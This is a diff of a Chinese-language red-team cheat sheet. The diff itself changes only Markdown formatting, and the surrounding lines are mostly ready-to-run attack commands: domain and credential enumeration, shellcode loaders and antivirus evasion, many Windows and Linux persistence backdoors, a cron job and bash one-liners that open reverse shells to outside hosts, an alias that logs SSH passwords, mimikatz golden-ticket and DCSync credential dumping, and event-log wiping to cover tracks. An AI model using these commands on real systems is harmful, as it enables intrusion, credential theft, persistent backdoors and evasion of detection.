 net localgroup administrators ------> 本机管理员[通常含有域用户]
 net user /domain ------> 查询域用户
@@ -1188,7 +1188,7 @@ net view /domain:domainname
 
 dsquery
 
-```text
+```
 dsquery computer domainroot -limit 65535 && net group "domain
 computers" /domain ------> 列出该域内所有机器名
 dsquery user domainroot -limit 65535 && net user /domain------>列出该域内所有用户名
@@ -1263,7 +1263,7 @@ dsquery server && net time /domain------>列出该域内域控制器
 
 **计划任务**
 
-```text
+```
 crontab -l
 ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
@@ -1280,7 +1280,7 @@ cat /var/spool/cron/crontabs/root
 
 **SUID**
 
-```text
+```
 find / -user root -perm -4000 -print 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 find / -user root -perm -4000 -exec ls -ldb {} \;
@@ -1288,7 +1288,7 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 
 **系统服务的错误权限配置漏洞**
 
-```text
+```
 cat /var/apache2/config.inc
 cat /var/lib/mysql/mysql/user.MYD
 cat /root/anaconda-ks.cfg
@@ -1296,7 +1296,7 @@ cat /root/anaconda-ks.cfg
 
 **不安全的文件/文件夹权限配置**
 
-```text
+```
 cat ~/.bash_history
 cat ~/.nano_history
 cat ~/.atftp_history
@@ -1306,7 +1306,7 @@ cat ~/.php_history
 
 **找存储的明文用户名，密码**
 
-```text
+```
 grep -i user [filename]
 grep -i pass [filename]
 grep -C 5 "password" [filename]
@@ -1315,7 +1315,7 @@ find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla
 
 ## 权限维持
 
-### C&C免杀对抗多维度分析
+### C\&C免杀对抗多维度分析
 
 **查杀方式**
 
@@ -1327,19 +1327,19 @@ find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla
 
 避免被杀软直接获取到真正shellcode（因为性能等原因 杀软不会暴力枚举解密内容）
 
-2、源码级免杀（自主研发C&C工具）
+2、源码级免杀（自主研发C\&C工具）
 
 **对抗-内存扫描**
 
-各种语言自定义加载器，比如使用C\# 编写ShellCode Loader
+各种语言自定义加载器，比如使用C# 编写ShellCode Loader
 
-运行机制不同（C\#使用虚拟机解释后运行，Golang编译运行）杀软没足够精力跟进各种形式的加载器
+运行机制不同（C#使用虚拟机解释后运行，Golang编译运行）杀软没足够精力跟进各种形式的加载器
 
 **对抗-流量分析**
 
 域前置 - Domain Fronting
 
- 流量路径`CDN->IP->c2`
+&#x20;流量路径`CDN->IP->c2`
 
 **对抗-行为分析**
 
@@ -1355,7 +1355,7 @@ find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla
 
 可以把CS生成的RAW的beacon.bin转成shellcode
 
-```text
+```
 python2 ConvertShellcode.py beacon.bin
 ```
 
@@ -1390,9 +1390,9 @@ def create_app():
     return app
 ```
 
-#### 二、C\#编写Loader
+#### 二、C#编写Loader
 
-**客户端：Loder从网络加载Shellcode（随机生成key去请求shellcode） -&gt; 解密 -&gt; 创建进程 运行上线**
+**客户端：Loder从网络加载Shellcode（随机生成key去请求shellcode） -> 解密 -> 创建进程 运行上线**
 
 ```c
 //WLoader C#
@@ -1605,7 +1605,7 @@ WinlogonHack WinlogonHack 是一款用来劫取远程3389登录密码的工具�
 
 **WMI** : 存储：
 
-```text
+```
 $StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
 $StaticClass.Name = 'Win32_Command'
 $StaticClass.Put()
@@ -1615,27 +1615,27 @@ $StaticClass.Put()
 
 读取:
 
-```text
+```
 $Payload=([WmiClass] 'Win32_Command').Properties['Command'].Value
 ```
 
 **包含数字签名的PE文件** 利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名 **特殊ADS** …
 
-```text
+```
 type putty.exe > ...:putty.exe
 wmic process call create c:\test\ads\...:putty.exe
 ```
 
 特殊COM文件
 
-```text
+```
 type putty.exe > \\.\C:\test\ads\COM1:putty.exe
 wmic process call create \\.\C:\test\ads\COM1:putty.exe
 ```
 
 磁盘根目录
 
-```text
+```
 type putty.exe >C:\:putty.exe 
 wmic process call create C:\:putty.exe
 ```
@@ -1644,14 +1644,14 @@ wmic process call create C:\:putty.exe
 
 用户级
 
-```text
+```
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
 ```
 
 管理员
 
-```text
+```
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
@@ -1661,7 +1661,7 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\R
 
 由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：
 
-```text
+```
 HKLM\SYSTEM\CurrentControlSet\Control\hivelist
 HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager
 ```
@@ -1670,13 +1670,13 @@ HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager
 
 WinLogon进程加载的login scripts,具体键值：
 
-```text
+```
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
 ```
 
 **6、Startup Keys**
 
-```text
+```
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
@@ -1687,7 +1687,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell
 
 创建服务
 
-```text
+```
 sc create [ServerName] binPath= BinaryPathName
 ```
 
@@ -1695,7 +1695,7 @@ sc create [ServerName] binPath= BinaryPathName
 
 本质上是Internet Explorer启动时加载的DLL模块
 
-```text
+```
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects
 ```
 
@@ -1703,20 +1703,20 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser He
 
 加载User32.dll会加载的DLL
 
-```text
+```
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
 ```
 
 **10、文件关联**
 
-```text
+```
 HKEY_LOCAL_MACHINE\Software\Classes
 HKEY_CLASSES_ROOT
 ```
 
 **11、bitsadmin**
 
-```text
+```
 bitsadmin /create backdoor
 bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe
 bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://host.com/calc.sct scrobj.dll"
@@ -1725,7 +1725,7 @@ bitsadmin /Resume backdoor
 
 **12、mof**
 
-```text
+```
 pragma namespace("\\\\.\\root\\subscription") 
 instance of __EventFilter as $EventFilter
 {
@@ -1751,7 +1751,7 @@ Filter = $EventFilter;
 
 管理员执行：
 
-```text
+```
 mofcomp test.mof
 ```
 
@@ -1759,7 +1759,7 @@ mofcomp test.mof
 
 每隔60秒执行一次notepad.exe
 
-```text
+```
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\Windows\System32\notepad.exe",CommandLineTemplate="C:\Windows\System32\notepad.exe"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""
@@ -1769,7 +1769,7 @@ wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filt
 
 劫持计划任务UserTask，在系统启动时加载dll
 
-```text
+```
 function Invoke-ScheduledTaskComHandlerUserTask
 {
 [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
@@ -1803,7 +1803,7 @@ Invoke-ScheduledTaskComHandlerUserTask -Command "C:\test\testmsg.dll" -Verbose
 
 **15、Netsh**
 
-```text
+```
 netsh add helper c:\test\netshtest.dll
 ```
 
@@ -1860,7 +1860,7 @@ netsh add helper c:\test\netshtest.dll
 
 COM组件劫持，不需要重启系统，不需要管理员权限 通过修改注册表实现
 
-```text
+```
 HKCU\Software\Classes\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}
 HKCU\Software\Classes\CLSID{fbeb8a05-beee-4442-804e-409d6c4515e9}
 HKCU\Software\Classes\CLSID{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}
@@ -1869,11 +1869,11 @@ HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}
 
 **26、Windows FAX DLL Injection**
 
-通过DLL劫持，劫持Explorer.exe对`fxsst.dll`的加载 Explorer.exe在启动时会加载`c:\Windows\System32\fxsst.dll`\(服务默认开启，用于传真服务\)将payload.dll保存在`c:\Windows\fxsst.dll`，能够实现dll劫持，劫持Explorer.exe对`fxsst.dll`的加载
+通过DLL劫持，劫持Explorer.exe对`fxsst.dll`的加载 Explorer.exe在启动时会加载`c:\Windows\System32\fxsst.dll`(服务默认开启，用于传真服务)将payload.dll保存在`c:\Windows\fxsst.dll`，能够实现dll劫持，劫持Explorer.exe对`fxsst.dll`的加载
 
 **27、特殊注册表键值**
 
-在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取\(使用Win32 API\)，但系统能够执行\(使用Native API\)。
+在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。
 
 [《渗透技巧——"隐藏"注册表的创建》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/)
 
@@ -1881,11 +1881,11 @@ HKCU\Software\Classes\Wow6432Node\CLSID{BCDE0395-E52F-467C-8E3D-C4579291692E}
 
 **28、快捷方式后门**
 
-替换我的电脑快捷方式启动参数 POC : [https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK\_backdoor.ps1](https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1)
+替换我的电脑快捷方式启动参数 POC : [https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK\_backdoor.ps1](https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK\_backdoor.ps1)
 
 **29、Logon Scripts**
 
-```text
+```
 New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "c:\test\11.bat" -propertyType string | Out-Null
 ```
 
@@ -1899,14 +1899,14 @@ New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "c:\test\11.
 
 每60分钟反弹一次shell给dns.wuyun.org的53端口
 
-```text
+```
 #!bash
 (crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/dns.wuyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
 ```
 
 **硬链接sshd**
 
-```text
+```
 #!bash
 ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;
 ```
@@ -1915,7 +1915,7 @@ ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;
 
 **SSH Server wrapper**
 
-```text
+```
 #!bash
 cd /usr/sbin
 mv sshd ../bin
@@ -1927,7 +1927,7 @@ chmod u+x sshd
 /etc/init.d/sshd restart
 ```
 
-```text
+```
 socat STDIO TCP4:192.168.206.142:22,sourceport=13377
 ```
 
@@ -1935,7 +1935,7 @@ socat STDIO TCP4:192.168.206.142:22,sourceport=13377
 
 vim当前用户下的.bashrc文件,末尾添加
 
-```text
+```
 #!bash
 alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'
 ```
@@ -1944,11 +1944,11 @@ source .bashrc
 
 **Cymothoa\_进程注入backdoor**
 
-```text
+```
 ./cymothoa -p 2270 -s 1 -y 7777
 ```
 
-```text
+```
 nc -vv ip 7777
 ```
 
@@ -1965,8 +1965,8 @@ nc -vv ip 7777
 
 ### WEB后门
 
-PHP Meterpreter后门 Aspx Meterpreter后门 weevely webacoo  
- ....
+PHP Meterpreter后门 Aspx Meterpreter后门 weevely webacoo\
+&#x20;....
 
 #### PHP
 
@@ -2008,7 +2008,7 @@ Use age：cmd.php?a=system(whoami);
 
 **杀死PHP不死马**
 
-```text
+```
 1、高权限，重启服务
 service apache2 restart
 service php restart
@@ -2020,13 +2020,13 @@ killall apache2
 
 #### JSP
 
-Tomcat无文件Shell： [https://github.com/z1Ro0/tomcat\_nofile\_webshell](https://github.com/z1Ro0/tomcat_nofile_webshell)
+Tomcat无文件Shell： [https://github.com/z1Ro0/tomcat\_nofile\_webshell](https://github.com/z1Ro0/tomcat\_nofile\_webshell)
 
 冰蝎去特征（请参考酒仙桥六号部队的文章）
 
-[冰蝎，从入门到魔改](https://mp.weixin.qq.com/s/s_DcLdhEtIZkC2_z0Zz4FQ)
+[冰蝎，从入门到魔改](https://mp.weixin.qq.com/s/s\_DcLdhEtIZkC2\_z0Zz4FQ)
 
-[冰蝎改造之不改动客户端=&gt;内存马](https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&mid=2247484318&idx=1&sn=ece9e52218be0ea84ef166c3bfd20f23&chksm=fcb7811bcbc0080dd2c39f228dcfe069880218b9f354b1283606af680b1eaecdc07a8a43b188&scene=126&sessionid=1596615082&key=4024143df9a90d6cf039e6e552bb5cc12f755fd25a44855e8dfaff85efc30720e50fd9f3299dbb007c78e96c833dc3df98a87f4c4a4e3ccff0084c0ad0325d06a0265851bfa777df7f014bc8d790632f&ascene=1&uin=MTUwNjgwNTkxMA%3D%3D&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=AzFdHdxTih44P2kITVRk35s%3D&pass_ticket=lppPNqJhx8ZD573ypwsqgQ41%2F%2BJd%2B2avwvIfBnLfOjeNcQkihuzk3CgS%2F36Je%2Bnb)
+[冰蝎改造之不改动客户端=>内存马](https://mp.weixin.qq.com/s?\_\_biz=MzU2NTc2MjAyNg==\&mid=2247484318\&idx=1\&sn=ece9e52218be0ea84ef166c3bfd20f23\&chksm=fcb7811bcbc0080dd2c39f228dcfe069880218b9f354b1283606af680b1eaecdc07a8a43b188\&scene=126\&sessionid=1596615082\&key=4024143df9a90d6cf039e6e552bb5cc12f755fd25a44855e8dfaff85efc30720e50fd9f3299dbb007c78e96c833dc3df98a87f4c4a4e3ccff0084c0ad0325d06a0265851bfa777df7f014bc8d790632f\&ascene=1\&uin=MTUwNjgwNTkxMA%3D%3D\&devicetype=Windows+10+x64\&version=62090070\&lang=zh\_CN\&exportkey=AzFdHdxTih44P2kITVRk35s%3D\&pass\_ticket=lppPNqJhx8ZD573ypwsqgQ41%2F%2BJd%2B2avwvIfBnLfOjeNcQkihuzk3CgS%2F36Je%2Bnb)
 
 #### 隐藏WebShell
 
@@ -2038,7 +2038,7 @@ Tomcat无文件Shell： [https://github.com/z1Ro0/tomcat\_nofile\_webshell](http
 
 #### 反弹Shell
 
-```text
+```
 #Bash
 bash -i >& /dev/tcp/attackerip/6666 0>&1
 
@@ -2066,13 +2066,13 @@ https://github.com/lukechilds/reverse-shell
 
 > **攻击机 VPS 监听接 shell**
 
-```text
+```
 nc -lvp 666
 ```
 
 ## 横向渗透
 
-#### 
+####
 
 ### 端口渗透
 
@@ -2106,19 +2106,19 @@ nc -lvp 666
 
 **常见的默认端口**
 
-**1、web类\(web漏洞/敏感目录\)**
+**1、web类(web漏洞/敏感目录)**
 
 第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix ...
 
-```text
+```
 80 web 
 80-89 web 
 8000-9090 web 
 ```
 
-**2、数据库类\(扫描弱口令\)**
+**2、数据库类(扫描弱口令)**
 
-```text
+```
 1433 MSSQL 
 1521 Oracle 
 3306 MySQL 
@@ -2126,9 +2126,9 @@ nc -lvp 666
 50000 DB2
 ```
 
-**3、特殊服务类\(未授权/命令执行类/漏洞\)**
+**3、特殊服务类(未授权/命令执行类/漏洞)**
 
-```text
+```
 443 SSL心脏滴血 
 445 ms08067/ms11058/ms17010等 
 873 Rsync未授权 
@@ -2142,9 +2142,9 @@ nc -lvp 666
 50070,50030 hadoop默认端口未授权访问 
 ```
 
-**4、常用端口类\(扫描弱口令/端口爆破\)**
+**4、常用端口类(扫描弱口令/端口爆破)**
 
-```text
+```
 21 ftp 
 22 SSH 
 23 Telnet 
@@ -2155,7 +2155,7 @@ nc -lvp 666
 
 **5、端口合计所对应的服务**
 
-```text
+```
 21 ftp 
 22 SSH 
 23 Telnet 
@@ -2215,7 +2215,7 @@ nc -lvp 666
 50070,50030 hadoop默认端口未授权访问
 ```
 
-#### 
+####
 
 ### 域渗透
 
@@ -2223,7 +2223,7 @@ nc -lvp 666
 
 **powerview.ps1**
 
-```text
+```
 Get-NetDomain - gets the name of the current user's domain
 Get-NetForest - gets the forest associated with the current user's domain
 Get-NetForestDomains - gets all domains for the current forest
@@ -2296,13 +2296,13 @@ SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在�
 
 **MS14-068 Kerberos**
 
-```text
+```
 python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机
 ```
 
-利用mimikatz将工具得到的[TGT\_domainuser@SERVER.COM.ccache](mailto:TGT_domainuser@SERVER.COM.ccache)写入内存，创建缓存证书：
+利用mimikatz将工具得到的[TGT\_domainuser@SERVER.COM.ccache](mailto:TGT\_domainuser@SERVER.COM.ccache)写入内存，创建缓存证书：
 
-```text
+```
 mimikatz.exe "kerberos::ptc c:TGT_darthsidious@pentest.com.ccache" exit
 net use k: \pentest.comc$
 ```
@@ -2325,11 +2325,11 @@ Kerberoast可以作为一个有效的方法从Active Directory中以普通用户
 
 在域上抓取的哈希
 
-```text
+```
 lsadump::dcsync /domain:pentest.com /user:krbtgt
 ```
 
-```text
+```
 kerberos::purge
 kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribi
 kerberos::ptt administrator.kiribi
@@ -2355,19 +2355,19 @@ net use k: \pnet use k: \pentest.comc$
 
 与上面SPN扫描类似的原理 [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast) 获取所有用作SPN的帐户
 
-```text
+```
 setspn -T PENTEST.com -Q */*
 ```
 
 从Mimikatz的RAM中提取获得的门票
 
-```text
+```
 kerberos::list /export
 ```
 
 用rgsrepcrack破解
 
-```text
+```
 tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
 
@@ -2399,23 +2399,23 @@ tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kir
 
 * 使用VSS卷影副本
 * Ntdsutil中获取NTDS.DIT​​文件
-* PowerShell中提取NTDS.DIT --&gt;[Invoke-NinaCopy](https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy)
+* PowerShell中提取NTDS.DIT -->[Invoke-NinaCopy](https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy)
 * 使用Mimikatz提取
 
-```text
+```
 mimikatz lsadump::lsa /inject exit 
 ```
 
 * 使用PowerShell Mimikatz
 * 使用Mimikatz的DCSync 远程转储Active Directory凭证 提取 KRBTGT用户帐户的密码数据：
 
-```text
+```
 Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt"exit
 ```
 
 管理员用户帐户提取密码数据：
 
-```text
+```
 Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator" exit
 
 ```
@@ -2428,7 +2428,7 @@ Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：A
 
 [https://adsecurity.org/?p=1929](https://adsecurity.org/?p=1929) DS恢复模式密码维护 DSRM密码同步
 
-> Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:[https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：\[巧用DSRM密码同步将域控权限持久化\]\(http://drops.xmd5.com/static/drops/tips-9297.html\)](https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,%E5%8F%AF%E5%8F%82%E8%80%83%EF%BC%9A%5B%E5%B7%A7%E7%94%A8DSRM%E5%AF%86%E7%A0%81%E5%90%8C%E6%AD%A5%E5%B0%86%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96%5D%28http://drops.xmd5.com/static/drops/tips-9297.html%29)
+> Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:[https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：\[巧用DSRM密码同步将域控权限持久化\](http://drops.xmd5.com/static/drops/tips-9297.html)](https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,%E5%8F%AF%E5%8F%82%E8%80%83%EF%BC%9A\[%E5%B7%A7%E7%94%A8DSRM%E5%AF%86%E7%A0%81%E5%90%8C%E6%AD%A5%E5%B0%86%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96]\(http://drops.xmd5.com/static/drops/tips-9297.html\))
 
 [DCshadow](https://www.dcshadow.com/)
 
@@ -2436,7 +2436,7 @@ Mimikatz "privilege::debug" "lsadump::dcsync /domain:rd.adsecurity.org /user：A
 
 简单的理解为SSP就是一个DLL，用来实现身份认证
 
-```text
+```
 privilege::debug
 misc::memssp
 ```
@@ -2447,7 +2447,7 @@ misc::memssp
 
 SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户
 
-```text
+```
 mimikatz "privilege::debug" "misc::addsid bobafett ADSAdministrator"
 ```
 
@@ -2508,9 +2508,9 @@ mimikatz "privilege::debug" "misc::addsid bobafett ADSAdministrator"
 
 * [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
-* [DeathStar](https://github.com/byt3bl33d3r/DeathStar)
+*   [DeathStar](https://github.com/byt3bl33d3r/DeathStar)
 
-  > 利用过程：[http://www.freebuf.com/sectool/160884.html](http://www.freebuf.com/sectool/160884.html)
+    > 利用过程：[http://www.freebuf.com/sectool/160884.html](http://www.freebuf.com/sectool/160884.html)
 
 ### 在远程系统上执行程序
 
@@ -2521,14 +2521,14 @@ mimikatz "privilege::debug" "misc::addsid bobafett ADSAdministrator"
 * Smbexec
 * Powershell remoting
 * DCOM
-* Winrm \([https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)\)
+* Winrm ([https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm))
 
 ### IOT相关
 
 * 1、路由器 [routersploit](https://github.com/reverse-shell/routersploit)
 * 2、打印机 [PRET](https://github.com/RUB-NDS/PRET)
 * 3、IOT exp [https://www.exploitee.rs/](https://www.exploitee.rs/)
-* 4、相关 [OWASP-Nettacker](https://www.owasp.org/index.php/OWASP_Nettacker) [isf](https://github.com/dark-lbp/isf) [icsmaster](https://github.com/w3h/icsmaster)
+* 4、相关 [OWASP-Nettacker](https://www.owasp.org/index.php/OWASP\_Nettacker) [isf](https://github.com/dark-lbp/isf) [icsmaster](https://github.com/w3h/icsmaster)
 
 ### 中间人
 
@@ -2536,7 +2536,7 @@ mimikatz "privilege::debug" "misc::addsid bobafett ADSAdministrator"
 * [Ettercap](https://github.com/Ettercap/ettercap)
 * [Responder](https://github.com/SpiderLabs/Responder)
 * [MITMf](https://github.com/byt3bl33d3r/MITMf)
-* [3r/MITMf\)](https://github.com/evilsocket/bettercap)
+* [3r/MITMf)](https://github.com/evilsocket/bettercap)
 
 ### 规避杀软及检测
 
@@ -2562,19 +2562,19 @@ mimikatz "privilege::debug" "misc::addsid bobafett ADSAdministrator"
 
 获取日志分类列表：
 
-```text
+```
 wevtutil el >1.txt
 ```
 
 获取单个日志类别的统计信息： eg.
 
-```text
+```
 wevtutil gli "windows powershell"
 ```
 
 回显：
 
-```text
+```
 creationTime: 2016-11-28T06:01:37.986Z
 lastAccessTime: 2016-11-28T06:01:37.986Z
 lastWriteTime: 2017-08-08T08:01:20.979Z
@@ -2586,13 +2586,13 @@ oldestRecordNumber: 1
 
 查看指定日志的具体内容：
 
-```text
+```
 wevtutil qe /f:text "windows powershell"
 ```
 
 删除单个日志类别的所有信息：
 
-```text
+```
 wevtutil cl "windows powershell"
 ```
 
@@ -2605,11 +2605,11 @@ wevtutil cl "windows powershell"
 
 ### msf
 
-```text
+```
 run clearlogs 
 ```
 
-```text
+```
 clearev 
 ```
 
@@ -2621,4 +2621,3 @@ clearev
 @del "%USERPROFILE%\My Documents\Default.rdp" /a
 @exit
 ```
-
